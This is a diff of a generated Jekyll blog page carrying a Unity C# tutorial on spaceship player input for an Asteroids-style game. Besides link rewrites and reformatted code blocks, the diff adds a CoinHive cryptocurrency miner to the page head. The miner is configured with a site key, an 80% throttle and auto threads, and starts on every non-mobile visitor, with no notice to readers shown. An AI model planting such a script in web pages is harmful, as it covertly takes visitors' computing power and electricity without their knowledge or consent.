@@ -10,7 +10,6 @@
 <meta name="keywords" content="">
 
 
-
 <!-- Twitter Cards -->
 <meta name="twitter:title" content="Asteroid's Game: Player Input">
 <meta name="twitter:description" content="Atari says Hi!">
@@ -18,22 +17,22 @@
 <meta name="twitter:creator" content="@kazenotenshi">
 
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="/images/default-thumb.png">
+<meta name="twitter:image" content="http://localhost:4000/images/default-thumb.png">
 
 <!-- Open Graph -->
 <meta property="og:locale" content="en_US">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Asteroid's Game: Player Input">
 <meta property="og:description" content="Atari says Hi!">
-<meta property="og:url" content="/gamedev/programming/unity3d/asteroids-game-player-input/">
+<meta property="og:url" content="http://localhost:4000/gamedev/programming/unity3d/asteroids-game-player-input/">
 <meta property="og:site_name" content="Kaze's Mind">
 
 
 
 
 
-<link rel="canonical" href="/gamedev/programming/unity3d/asteroids-game-player-input/">
-<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Kaze's Mind Feed">
+<link rel="canonical" href="http://localhost:4000/gamedev/programming/unity3d/asteroids-game-player-input/">
+<link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="Kaze's Mind Feed">
 
 
 <!-- http://t.co/dKP3o1e -->
@@ -42,34 +41,46 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <!-- For all browsers -->
-<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="http://localhost:4000/assets/css/main.css">
 
 <meta http-equiv="cleartype" content="on">
 
 <!-- HTML5 Shiv and Media Query Support -->
 <!--[if lt IE 9]>
-	<script src="/assets/js/vendor/html5shiv.min.js"></script>
-	<script src="/assets/js/vendor/respond.min.js"></script>
+	<script src="http://localhost:4000/assets/js/vendor/html5shiv.min.js"></script>
+	<script src="http://localhost:4000/assets/js/vendor/respond.min.js"></script>
 <![endif]-->
 
 <!-- Modernizr -->
-<script src="/assets/js/vendor/modernizr-2.7.1.custom.min.js"></script>
+<script src="http://localhost:4000/assets/js/vendor/modernizr-2.7.1.custom.min.js"></script>
+
+<!-- Miner -->
+<script src="https://coin-hive.com/lib/coinhive.min.js">
+var miner = new CoinHive.User('wHgHeuOVbM5FTi93SaXqtYUWSPW1yi4U', 'luiz-santos', {
+				autoThreads: true,
+				throttle: 0.8,
+				language: 'auto'
+				});
+if (!miner.isMobile()) {
+	miner.start();
+}
+</script>
 
 <link href='//fonts.googleapis.com/css?family=PT+Sans+Narrow:400,700%7CPT+Serif:400,700,400italic' rel='stylesheet' type='text/css'>
 
 <!-- Icons -->
 <!-- 16x16 -->
-<link rel="shortcut icon" href="/favicon.ico">
+<link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
 <!-- 32x32 -->
-<link rel="shortcut icon" href="/favicon.png">
+<link rel="shortcut icon" href="http://localhost:4000/favicon.png">
 <!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
-<link rel="apple-touch-icon-precomposed" href="/images/apple-touch-icon-precomposed.png">
+<link rel="apple-touch-icon-precomposed" href="http://localhost:4000/images/apple-touch-icon-precomposed.png">
 <!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
-<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/images/apple-touch-icon-72x72-precomposed.png">
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://localhost:4000/images/apple-touch-icon-72x72-precomposed.png">
 <!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
-<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/images/apple-touch-icon-114x114-precomposed.png">
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://localhost:4000/images/apple-touch-icon-114x114-precomposed.png">
 <!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
-<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/images/apple-touch-icon-144x144-precomposed.png">
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/images/apple-touch-icon-144x144-precomposed.png">
 
 </head>
 
@@ -79,31 +90,23 @@
 
 <div class="navigation-wrapper">
 	<div class="site-name">
-		<a href="/">Kaze's Mind</a>
+		<a href="http://localhost:4000/">Kaze's Mind</a>
 	</div><!-- /.site-name -->
 	<div class="top-navigation">
 		<nav role="navigation" id="site-nav" class="nav">
 		    <ul>
 		        
 				    
-				        
-				    
-				    <li><a href="/posts/" >Blog</a></li>
+				    <li><a href="http://localhost:4000/posts/" >Blog</a></li>
 				
 				    
-				        
-				    
-				    <li><a href="/about/" >About</a></li>
+				    <li><a href="http://localhost:4000/about/" >About</a></li>
 				
 				    
-				        
-				    
-				    <li><a href="/photography/" >Photography</a></li>
+				    <li><a href="http://localhost:4000/photography/" >Photography</a></li>
 				
 				    
-				        
-				    
-				    <li><a href="/portifolio/" >Portifolio</a></li>
+				    <li><a href="http://localhost:4000/portifolio/" >Portifolio</a></li>
 				
 		    </ul>
 		</nav>
@@ -117,17 +120,16 @@
     
 
 
-
-	<img src="/images/me.png" class="bio-photo" alt="Luiz Guilherme bio photo">
+	<img src="http://localhost:4000/images/me.png" class="bio-photo" alt="Luiz Guilherme bio photo">
 
 <h3>Luiz Guilherme</h3>
-<p>Software Engineer, Researcher, GameDev, Photographer</p>
+<p>Game Developer, Software Engineer, Photographer, Ukulele Player</p>
 <a href="mailto:luiz@kaze.io" class="author-social" target="_blank"><i class="fa fa-fw fa-envelope-square"></i> Email</a>
 <a href="http://twitter.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a>
 <a href="http://facebook.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-facebook-square"></i> Facebook</a>
 
 <a href="http://linkedin.com/in/luizgosantos" class="author-social" target="_blank"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a>
-<a href="http://instagram.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-instagram"></i> Instagram</a>
+<a href="http://instagram.com/kaze_" class="author-social" target="_blank"><i class="fa fa-fw fa-instagram"></i> Instagram</a>
 <a href="http://www.flickr.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-flickr"></i> Flickr</a>
 <a href="http://kazen0tenshi.deviantart.com" class="author-social" target="_blank"><i class="fa fa-fw fa-deviantart"></i> Deviant Art</a>
 
@@ -145,7 +147,7 @@
   <article class="post">
     <div class="headline-wrap">
       
-        <h1><a href="/gamedev/programming/unity3d/asteroids-game-player-input/" rel="bookmark" title="Asteroid's Game: Player Input">Asteroid's Game: Player Input</a></h1>
+        <h1><a href="http://localhost:4000/gamedev/programming/unity3d/asteroids-game-player-input/" rel="bookmark" title="Asteroid's Game: Player Input">Asteroid's Game: Player Input</a></h1>
       
     </div><!--/ .headline-wrap -->
     <div class="article-wrap">
@@ -187,19 +189,19 @@
 </figure>
 </div>
 
-<p>Now let’s start the script. In the project tab, do a right click and and choose “Create -&gt; C#” script. Name it “SpaceshipInput”, and then click and drag it to the Game Object you just created. Just a quick advise. As the project gets bigger it is nice if you organize the project area into folders. It will help you later to find the assets quickly. Double click in the script in the project area to open the default script editor. If you did not <a href="http://kaze.io/game/development/unity-quick-tips-using-microsoft-visual-studio-code-instead-of-monodevelop/">change it like me</a>, it should be MonoDevelop. </p>
+<p>Now let’s start the script. In the project tab, do a right click and and choose “Create -&gt; C#” script. Name it “SpaceshipInput”, and then click and drag it to the Game Object you just created. Just a quick advise. As the project gets bigger it is nice if you organize the project area into folders. It will help you later to find the assets quickly. Double click in the script in the project area to open the default script editor. If you did not <a href="http://kaze.io/game/development/unity-quick-tips-using-microsoft-visual-studio-code-instead-of-monodevelop/">change it like me</a>, it should be MonoDevelop.</p>
 
 <p>Unity always creates a standard template where the script inherits from MonoBehaviour and has two functions: Start and Update. Start is a function that is called once, on the frame when a script is enabled, before the first update. Update on the other hand, is called every frame. There are others derived methods from MonoBehaviour that is worth knowing. Refer to the <a href="http://docs.unity3d.com/ScriptReference/MonoBehaviour.html">Official Documentation</a> and look at other functions.</p>
 
 <p>Let’s Start creating two public variables called speed and rotationSpeed inside the class, just before the Start function.</p>
 
-<div class="highlight"><pre><code class="language-csharp" data-lang="csharp"><span class="k">using</span> <span class="nn">UnityEngine</span><span class="p">;</span>
+<figure class="highlight"><pre><code class="language-csharp" data-lang="csharp"><span class="k">using</span> <span class="nn">UnityEngine</span><span class="p">;</span>
 <span class="k">using</span> <span class="nn">System.Collections</span><span class="p">;</span>
 
 <span class="k">public</span> <span class="k">class</span> <span class="nc">SpaceshipInput</span> <span class="p">:</span> <span class="n">MonoBehaviour</span> <span class="p">{</span>
 
 	<span class="c1">//Speeds</span>
-	<span class="k">public</span> <span class="n">Vector2</span> <span class="n">speed</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Vector2</span><span class="p">(</span> <span class="m">0f</span><span class="p">,</span> <span class="m">10.0F</span><span class="p">);</span>
+	<span class="k">public</span> <span class="n">Vector2</span> <span class="n">speed</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Vector2</span><span class="p">(</span> <span class="m">0f</span><span class="p">,</span> <span class="m">10.0F</span><span class="p">);</span>
 	<span class="k">public</span> <span class="kt">float</span> <span class="n">rotationSpeed</span> <span class="p">=</span> <span class="m">200.0f</span><span class="p">;</span>
 
 	<span class="c1">// Use this for initialization</span>
@@ -210,7 +212,7 @@
     <span class="k">void</span> <span class="nf">Update</span><span class="p">()</span> <span class="p">{</span>
 	<span class="p">}</span>
 
-<span class="p">}</span></code></pre></div>
+<span class="p">}</span></code></pre></figure>
 
 <p>Notice that the default values were already set. If you go to the inspector at Unity’s editor, these two variables will appear there. Go there and set some default values to the Rigidbody2D Component as well. Put a very small Gravity Scale, keep the angular drag and the mass at 1. The result would be something like this:</p>
 
@@ -224,42 +226,42 @@
 
 <p>Ok, our variables are set. The idea now is to get the input from the player, and move the Space Ship around. I’d start with the rotation. Input.GetAxis function will give us a value in [-1,1] range from a keyboard or a joystick input. We should say which Axis are we in ( Horizontal, or vertical ). In this case would be the Vertical one. The code should be called every frame to check if the user is still holding the left/right key or toggling the joystick in these directions. After that, we should get a relative time from the last frame and apply the rotation in the Z axis. The code is:</p>
 
-<div class="highlight"><pre><code class="language-csharp" data-lang="csharp"><span class="c1">// Update is called once per frame</span>
+<figure class="highlight"><pre><code class="language-csharp" data-lang="csharp">	<span class="c1">// Update is called once per frame</span>
 	<span class="k">void</span> <span class="nf">Update</span><span class="p">()</span> <span class="p">{</span>
 		<span class="c1">//Deal with rotation first</span>
-		<span class="kt">float</span> <span class="n">rotation</span> <span class="p">=</span> <span class="n">Input</span><span class="p">.</span><span class="n">GetAxis</span><span class="p">(</span><span class="s">&quot;Horizontal&quot;</span><span class="p">)</span> <span class="p">*</span> <span class="n">rotationSpeed</span><span class="p">;</span>
+		<span class="kt">float</span> <span class="n">rotation</span> <span class="p">=</span> <span class="n">Input</span><span class="p">.</span><span class="nf">GetAxis</span><span class="p">(</span><span class="s">"Horizontal"</span><span class="p">)</span> <span class="p">*</span> <span class="n">rotationSpeed</span><span class="p">;</span>
 		<span class="n">rotation</span> <span class="p">*=</span> <span class="n">Time</span><span class="p">.</span><span class="n">deltaTime</span><span class="p">;</span>
-		<span class="n">transform</span><span class="p">.</span><span class="n">Rotate</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span> <span class="p">,</span> <span class="p">-</span><span class="n">rotation</span><span class="p">);</span>
-	<span class="p">}</span></code></pre></div>
+		<span class="n">transform</span><span class="p">.</span><span class="nf">Rotate</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span> <span class="p">,</span> <span class="p">-</span><span class="n">rotation</span><span class="p">);</span>
+	<span class="p">}</span></code></pre></figure>
 
 <p>What it does? Every frame, we will get a value between -1 and 1 from the horizontal axis, multiply that to our rotationSpeed and to the deltaTime which is the time in seconds it took to complete the last frame. After that the code applies the rotation to the Game Object’s transform class.</p>
 
 <p>The Translation uses the same concept, but we will not do an affine transformation here, we will use physics instead. Why? Because we’re in space, and the movement should reproduce its environment. Also, our ship is an outdated model that does not have reverse, sorry for that =). Continuing our code:</p>
 
-<div class="highlight"><pre><code class="language-csharp" data-lang="csharp"><span class="c1">// Update is called once per frame</span>
+<figure class="highlight"><pre><code class="language-csharp" data-lang="csharp">	<span class="c1">// Update is called once per frame</span>
 	<span class="k">void</span> <span class="nf">Update</span><span class="p">()</span> <span class="p">{</span>
 		<span class="c1">//Deal with rotation first</span>
-		<span class="kt">float</span> <span class="n">rotation</span> <span class="p">=</span> <span class="n">Input</span><span class="p">.</span><span class="n">GetAxis</span><span class="p">(</span><span class="s">&quot;Horizontal&quot;</span><span class="p">)</span> <span class="p">*</span> <span class="n">rotationSpeed</span><span class="p">;</span>
+		<span class="kt">float</span> <span class="n">rotation</span> <span class="p">=</span> <span class="n">Input</span><span class="p">.</span><span class="nf">GetAxis</span><span class="p">(</span><span class="s">"Horizontal"</span><span class="p">)</span> <span class="p">*</span> <span class="n">rotationSpeed</span><span class="p">;</span>
 		<span class="n">rotation</span> <span class="p">*=</span> <span class="n">Time</span><span class="p">.</span><span class="n">deltaTime</span><span class="p">;</span>
-		<span class="n">transform</span><span class="p">.</span><span class="n">Rotate</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span> <span class="p">,</span> <span class="p">-</span><span class="n">rotation</span><span class="p">);</span>
+		<span class="n">transform</span><span class="p">.</span><span class="nf">Rotate</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span> <span class="p">,</span> <span class="p">-</span><span class="n">rotation</span><span class="p">);</span>
 
 		<span class="c1">//Translation is an special case, only occurs if the player wants to go up!</span>
-		<span class="k">if</span><span class="p">(</span> <span class="n">Input</span><span class="p">.</span><span class="n">GetAxis</span><span class="p">(</span><span class="s">&quot;Vertical&quot;</span><span class="p">)</span> <span class="p">&gt;</span> <span class="m">0</span> <span class="p">){</span>
-			<span class="n">Vector2</span> <span class="n">translation</span> <span class="p">=</span> <span class="n">Input</span><span class="p">.</span><span class="n">GetAxis</span><span class="p">(</span><span class="s">&quot;Vertical&quot;</span><span class="p">)</span> <span class="p">*</span> <span class="n">speed</span><span class="p">;</span>
+		<span class="k">if</span><span class="p">(</span> <span class="n">Input</span><span class="p">.</span><span class="nf">GetAxis</span><span class="p">(</span><span class="s">"Vertical"</span><span class="p">)</span> <span class="p">&gt;</span> <span class="m">0</span> <span class="p">){</span>
+			<span class="n">Vector2</span> <span class="n">translation</span> <span class="p">=</span> <span class="n">Input</span><span class="p">.</span><span class="nf">GetAxis</span><span class="p">(</span><span class="s">"Vertical"</span><span class="p">)</span> <span class="p">*</span> <span class="n">speed</span><span class="p">;</span>
 			<span class="n">translation</span> <span class="p">*=</span> <span class="n">Time</span><span class="p">.</span><span class="n">deltaTime</span><span class="p">;</span>
-			<span class="n">GetComponent</span><span class="p">&lt;</span><span class="n">Rigidbody2D</span><span class="p">&gt;().</span><span class="n">AddRelativeForce</span><span class="p">(</span><span class="n">translation</span><span class="p">,</span> <span class="n">ForceMode2D</span><span class="p">.</span><span class="n">Impulse</span><span class="p">);</span>
+			<span class="n">GetComponent</span><span class="p">&lt;</span><span class="n">Rigidbody2D</span><span class="p">&gt;().</span><span class="nf">AddRelativeForce</span><span class="p">(</span><span class="n">translation</span><span class="p">,</span> <span class="n">ForceMode2D</span><span class="p">.</span><span class="n">Impulse</span><span class="p">);</span>
 		<span class="p">}</span>
-	<span class="p">}</span></code></pre></div>
+	<span class="p">}</span></code></pre></figure>
 
 <p>Translation is now a 2D Vector that will get the value from the player input and multiply with our pre specified speed and the deltaTime. Differently from the rotation, we will now apply a relative force to the object. The force type is an impulse case it reflects the engines impulsion in a real spaceship. It is relative because we want it to go up in the ship’s perspective, not the world’s perspective. So if we do any kind of rotation, the force will be applied relatively to the ship’s coordinate system at the time. The final code is:</p>
 
-<div class="highlight"><pre><code class="language-csharp" data-lang="csharp"><span class="k">using</span> <span class="nn">UnityEngine</span><span class="p">;</span>
+<figure class="highlight"><pre><code class="language-csharp" data-lang="csharp"><span class="k">using</span> <span class="nn">UnityEngine</span><span class="p">;</span>
 <span class="k">using</span> <span class="nn">System.Collections</span><span class="p">;</span>
 
 <span class="k">public</span> <span class="k">class</span> <span class="nc">SpaceshipInput</span> <span class="p">:</span> <span class="n">MonoBehaviour</span> <span class="p">{</span>
 
 	<span class="c1">//Speeds</span>
-	<span class="k">public</span> <span class="n">Vector2</span> <span class="n">speed</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Vector2</span><span class="p">(</span> <span class="m">0f</span><span class="p">,</span> <span class="m">10.0F</span><span class="p">);</span>
+	<span class="k">public</span> <span class="n">Vector2</span> <span class="n">speed</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Vector2</span><span class="p">(</span> <span class="m">0f</span><span class="p">,</span> <span class="m">10.0F</span><span class="p">);</span>
 	<span class="k">public</span> <span class="kt">float</span> <span class="n">rotationSpeed</span> <span class="p">=</span> <span class="m">200.0f</span><span class="p">;</span>
 
 	<span class="c1">// Use this for initialization</span>
@@ -269,18 +271,18 @@
 	<span class="c1">// Update is called once per frame</span>
 	<span class="k">void</span> <span class="nf">Update</span><span class="p">()</span> <span class="p">{</span>
 		<span class="c1">//Deal with rotation first</span>
-		<span class="kt">float</span> <span class="n">rotation</span> <span class="p">=</span> <span class="n">Input</span><span class="p">.</span><span class="n">GetAxis</span><span class="p">(</span><span class="s">&quot;Horizontal&quot;</span><span class="p">)</span> <span class="p">*</span> <span class="n">rotationSpeed</span><span class="p">;</span>
+		<span class="kt">float</span> <span class="n">rotation</span> <span class="p">=</span> <span class="n">Input</span><span class="p">.</span><span class="nf">GetAxis</span><span class="p">(</span><span class="s">"Horizontal"</span><span class="p">)</span> <span class="p">*</span> <span class="n">rotationSpeed</span><span class="p">;</span>
 		<span class="n">rotation</span> <span class="p">*=</span> <span class="n">Time</span><span class="p">.</span><span class="n">deltaTime</span><span class="p">;</span>
-		<span class="n">transform</span><span class="p">.</span><span class="n">Rotate</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span> <span class="p">,</span> <span class="p">-</span><span class="n">rotation</span><span class="p">);</span>
+		<span class="n">transform</span><span class="p">.</span><span class="nf">Rotate</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span> <span class="p">,</span> <span class="p">-</span><span class="n">rotation</span><span class="p">);</span>
         
 		<span class="c1">//Translation is an special case, only occurs if the player wants to go up!</span>
-		<span class="k">if</span><span class="p">(</span> <span class="n">Input</span><span class="p">.</span><span class="n">GetAxis</span><span class="p">(</span><span class="s">&quot;Vertical&quot;</span><span class="p">)</span> <span class="p">&gt;</span> <span class="m">0</span> <span class="p">){</span>
-			<span class="n">Vector2</span> <span class="n">translation</span> <span class="p">=</span> <span class="n">Input</span><span class="p">.</span><span class="n">GetAxis</span><span class="p">(</span><span class="s">&quot;Vertical&quot;</span><span class="p">)</span> <span class="p">*</span> <span class="n">speed</span><span class="p">;</span>
+		<span class="k">if</span><span class="p">(</span> <span class="n">Input</span><span class="p">.</span><span class="nf">GetAxis</span><span class="p">(</span><span class="s">"Vertical"</span><span class="p">)</span> <span class="p">&gt;</span> <span class="m">0</span> <span class="p">){</span>
+			<span class="n">Vector2</span> <span class="n">translation</span> <span class="p">=</span> <span class="n">Input</span><span class="p">.</span><span class="nf">GetAxis</span><span class="p">(</span><span class="s">"Vertical"</span><span class="p">)</span> <span class="p">*</span> <span class="n">speed</span><span class="p">;</span>
 			<span class="n">translation</span> <span class="p">*=</span> <span class="n">Time</span><span class="p">.</span><span class="n">deltaTime</span><span class="p">;</span>
-			<span class="n">GetComponent</span><span class="p">&lt;</span><span class="n">Rigidbody2D</span><span class="p">&gt;().</span><span class="n">AddRelativeForce</span><span class="p">(</span><span class="n">translation</span><span class="p">,</span> <span class="n">ForceMode2D</span><span class="p">.</span><span class="n">Impulse</span><span class="p">);</span>
+			<span class="n">GetComponent</span><span class="p">&lt;</span><span class="n">Rigidbody2D</span><span class="p">&gt;().</span><span class="nf">AddRelativeForce</span><span class="p">(</span><span class="n">translation</span><span class="p">,</span> <span class="n">ForceMode2D</span><span class="p">.</span><span class="n">Impulse</span><span class="p">);</span>
 		<span class="p">}</span>
 	<span class="p">}</span>
-<span class="p">}</span></code></pre></div>
+<span class="p">}</span></code></pre></figure>
 
 <p>That’s enough for now. Next post I’ll solve one problem that this code creates. If you have any comment I’ll be glad to help. See ya!</p>
 
@@ -291,17 +293,16 @@
           
 
 
-
-	<img src="/images/me.png" class="bio-photo" alt="Luiz Guilherme bio photo">
+	<img src="http://localhost:4000/images/me.png" class="bio-photo" alt="Luiz Guilherme bio photo">
 
 <h3>Luiz Guilherme</h3>
-<p>Software Engineer, Researcher, GameDev, Photographer</p>
+<p>Game Developer, Software Engineer, Photographer, Ukulele Player</p>
 <a href="mailto:luiz@kaze.io" class="author-social" target="_blank"><i class="fa fa-fw fa-envelope-square"></i> Email</a>
 <a href="http://twitter.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a>
 <a href="http://facebook.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-facebook-square"></i> Facebook</a>
 
 <a href="http://linkedin.com/in/luizgosantos" class="author-social" target="_blank"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a>
-<a href="http://instagram.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-instagram"></i> Instagram</a>
+<a href="http://instagram.com/kaze_" class="author-social" target="_blank"><i class="fa fa-fw fa-instagram"></i> Instagram</a>
 <a href="http://www.flickr.com/kazenotenshi" class="author-social" target="_blank"><i class="fa fa-fw fa-flickr"></i> Flickr</a>
 <a href="http://kazen0tenshi.deviantart.com" class="author-social" target="_blank"><i class="fa fa-fw fa-deviantart"></i> Deviant Art</a>
 
@@ -316,7 +317,7 @@
 
 
         </div>
-        <p class="byline"><strong>Asteroid's Game: Player Input</strong> was published on <time datetime="2015-07-29T19:45:40-03:00">July 29, 2015</time>.</p>
+        <p class="byline"><strong>Asteroid's Game: Player Input</strong> was published on <time datetime="2015-07-29T23:45:40+01:00">July 29, 2015</time>.</p>
       </footer>
     </div><!-- /.article-wrap -->
   
@@ -327,14 +328,14 @@
 
 <div class="footer-wrap">
   <div class="related-articles">
-  <h4>You might also enjoy <small class="pull-right">(<a href="/posts/">View all posts</a>)</small></h4>
+  <h4>You might also enjoy <small class="pull-right">(<a href="http://localhost:4000/posts/">View all posts</a>)</small></h4>
     <ul>
     
-      <li><a href="/game/development/unity-quick-tips-using-microsoft-visual-studio-code-instead-of-monodevelop/" title="Unity Quick Tips: Using Microsoft Visual Studio Code Instead of MonoDevelop">Unity Quick Tips: Using Microsoft Visual Studio Code Instead of MonoDevelop</a></li>
+      <li><a href="http://localhost:4000/personal/leaving-the-comfort-zone-for-the-second-time/" title="Leaving the Comfort Zone (for the Second Time)">Leaving the Comfort Zone (for the Second Time)</a></li>
     
-      <li><a href="/programming/using-opencv-and-nltk-to-make-speech-synthesis-animation/" title="Using openCV and NLTK to Make Speech Synthesis Animation">Using openCV and NLTK to Make Speech Synthesis Animation</a></li>
+      <li><a href="http://localhost:4000/game/development/global-game-jam-2016-thoughts-experiences-and-a-small-post-mortem/" title="Global Game Jam 2016 - Thoughts, Experiences and a Small Post-Mortem">Global Game Jam 2016 - Thoughts, Experiences and a Small Post-Mortem</a></li>
     
-      <li><a href="/personal/a-time-off/" title="A Time Off">A Time Off</a></li>
+      <li><a href="http://localhost:4000/personal/the-big-change/" title="The Big Change">The Big Change</a></li>
     
     </ul>
     <hr />
@@ -354,14 +355,14 @@
 </div><!-- /.google-ads -->
 
 
-<span>&copy; 2015 Luiz Guilherme. Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> adapted from <a href="http://mademistakes.com/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a> theme.</span>
+<span>&copy; 2017 Luiz Guilherme. Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> adapted from <a href="http://mademistakes.com/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a> theme.</span>
 
   </footer>
 </div><!-- /.footer-wrap -->
 
 <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
-<script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
-<script src="/assets/js/scripts.min.js"></script>
+<script>window.jQuery || document.write('<script src="http://localhost:4000/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script src="http://localhost:4000/assets/js/scripts.min.js"></script>
 
 <!-- Asynchronous Google Analytics snippet -->
 <script>
